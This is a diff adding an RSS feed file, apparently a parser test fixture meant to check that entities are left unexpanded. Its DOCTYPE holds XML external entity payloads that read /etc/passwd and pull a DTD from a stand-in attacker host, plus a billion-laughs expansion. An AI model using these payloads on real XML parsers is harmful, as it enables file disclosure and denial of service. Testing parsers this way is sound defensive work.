@@ -1,0 +1,21 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "https://attacker.example/evil.dtd">
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!-- a ] bracket and a > inside a comment do not end the subset -->
+]>
+<rss version="2.0">
+  <channel>
+    <title>Entities stay as written</title>
+    <link>https://doctype.example/</link>
+    <item>
+      <title>Leak &xxe; and &remote;</title>
+      <link>https://doctype.example/leak</link>
+      <description>Laugh &lol3; &amp; carry on</description>
+      <pubDate>Sat, 12 Sep 2026 10:00:00 +0000</pubDate>
+    </item>
+  </channel>
+</rss>
